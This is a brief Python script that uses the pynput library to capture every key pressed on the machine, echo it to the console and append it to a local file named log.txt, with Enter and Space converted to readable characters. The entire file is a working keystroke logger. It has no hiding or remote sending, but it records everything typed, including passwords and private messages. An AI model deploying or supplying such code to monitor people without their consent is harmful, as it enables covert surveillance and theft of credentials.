from pynput.keyboard import Key, Listener

def writefile(key):
    key = str(key)
    key = key.replace("'", "")
    key = key.replace("Key.enter", "\n")
    key = key.replace("Key.space", " ")
    with open("log.txt", "a") as f:
        f.write(key)

def onpress(key):
    print(key)
    writefile(key)


def onrelease(key):
    print(key)

with Listener(on_press=onpress, on_release=onrelease) as listener:
    listener.join()